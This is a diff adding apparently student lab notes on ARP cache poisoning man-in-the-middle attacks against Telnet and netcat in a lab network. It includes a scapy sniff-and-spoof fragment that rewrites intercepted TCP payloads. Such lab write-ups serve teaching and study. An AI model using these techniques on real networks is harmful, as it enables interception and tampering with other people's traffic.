@@ -75,4 +75,67 @@
 
 ## Task 2: MITM Attack on Telnet using ARP Cache Poisoning
 
+### Step 1: Poison A's and B's ARP cache
+- on host A
+    ```
+    # arp -n
+    Address        HWtype  HWaddress           Flags Mask      Iface
+    10.9.0.6       ether   02:42:0a:09:00:69   C               eth0
+    ```
+- on host B
+    ```
+    # arp -n
+    Address        HWtype  HWaddress           Flags Mask      Iface
+    10.9.0.5       ether   02:42:0a:09:00:69   C               eth0
+    ```
+### Step 2: Testing
+- turn the IP forwarding of Host M off `sysctl net.ipv4.ip_forward=0`
+- ping each other between A and B: unable to get reply
+
+### Step 3: Turn on IP forwarding and test again
+- `sysctl net.ipv4.ip_forward=1`
+- both A and B can get reply when they ping each other
+- However, in Wireshark, we can see that, if we take request from A as an example, the IP of the reply packet is B's IP, not M's IP, and if we check the ARP cache on A, the MAC address for B's IP has been modified to B's MAC address, this is because when A pings B, it will broadcast an ARP request asking for the MAC address of `10.9.0.6`, and according to task `1.B`, host B's reply will overwrite the entry in A's ARP cache
+
+### Step 4: Launch the MITM attack
+- assume that A is the Telnet client and B is the Telnet server
+- after A has connected to the Telnet server on B, for every key strok typed in A's Telnet window, a TCP packet will be generated and sent to B, we will intercept the TCP packet, and replace each typed character with a fixed character `Z`
+- write a sniff-and-spoof program, for packets sent from A to B, and spoof a TCP packet with different data, for packets from B to A, we do not make any change
+- filter: `'tcp and host 10.9.0.5 and host 10.9.0.6 and ether dst 02:42:0a:09:00:69'`, because we don't want to capture packets from M to A or B
+- core code that modifies the data
+    ```
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
+        if pkt[TCP].payload:
+            data = pkt[TCP].payload.load
+            list_str = list(data)
+            list_str[-1] = 'Z'
+            newdata = ''.join(list_str)
+            send(newpkt/newdata)
+        else:
+            send(newpkt)
+    ```
+- result: after running this program, when typing on A's Telnet window, no matter which key is typed, it becomes a letter `Z`
+- tips: while doing this task, there is a possibility that the ARP cache of A or B is modified, because they sometimes will broadcast ARP requests asking for each other's MAC address, so we need to regularly check this, and invoke the ARP poisoning program again
 ## Task 3: MITM Attack on Netcat using ARP Cache Poisoning
+- similar to task `2`, except that A and B are communicating using `netcat`
+- on host B: `nc -lp 9090`
+- on host A: `nc 10.9.0.6 9090`
+- in `netcat`, each line of message typed on A will be put into a TCP packet sent to B, which simply displays the message
+- replace the data with our first name (e.g., `123456789` -> `heisenbug`), the length of the modified data should be the same as the original data, or we will mess up the TCP sequence number, and hence the entire TCP connection
+- remember that when typing `ABC` and enter, there will be 4 bytes of data (`'ABC'` and `\n`), I kept the last byte `'\n'`
+- on host A's `netcat` window
+    ```
+    # nc 10.9.0.6 9090
+    ABCDEFG12
+    123X
+    ```
+- on host B
+    ```
+    # nc -lp 9090
+    heisenbug
+    heis
+    ```
